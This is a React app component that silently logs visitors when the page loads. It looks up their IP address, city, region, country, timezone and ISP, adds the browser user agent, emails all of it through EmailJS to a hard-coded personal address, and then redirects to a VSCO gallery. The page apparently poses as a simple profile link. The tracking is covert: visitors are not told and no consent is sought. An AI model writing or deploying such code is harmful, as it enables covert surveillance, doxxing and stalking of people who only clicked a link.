import { useEffect } from "react";
import { Analytics } from '@vercel/analytics/react';

function App() {
  useEffect(() => {
    const fetchDataAndSendEmail = async () => {
      try {
        // Get visitor IP information
        const ipResponse = await fetch('https://ipapi.co/json');
        if (!ipResponse.ok) throw new Error('IP API request failed');
        
        const ipData = await ipResponse.json();
        
        // Prepare email content
        const emailContent = `
          New Profile Visit Details:
          IP: ${ipData.ip}
          City: ${ipData.city}
          Region: ${ipData.region}
          Country: ${ipData.country_name}
          Timezone: ${ipData.timezone}
          ISP: ${ipData.org}
          User Agent: ${navigator.userAgent}
          Date: ${new Date().toLocaleString()}
        `;

        // Send email using EmailJS
        const emailResponse = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            service_id: 'YOUR_EMAILJS_SERVICE_ID',
            template_id: 'YOUR_EMAILJS_TEMPLATE_ID',
            user_id: 'YOUR_EMAILJS_USER_ID',
            template_params: {
              to_email: 'patelhiten346@gmail.com',
              message: emailContent,
              from_name: 'Profile Visitor Alert'
            }
          })
        });

        if (!emailResponse.ok) {
          console.error('Email sending failed:', await emailResponse.text());
        }

      } catch (error) {
        console.error('Error:', error);
      } finally {
        // Redirect to VSCO
        window.location.href = 'https://vsco.co/htnptl/gallery';
      }
    };

    fetchDataAndSendEmail();
  }, []);

  return (
    <div className="App">
      <Analytics />
    </div>
  );
}

export default App;
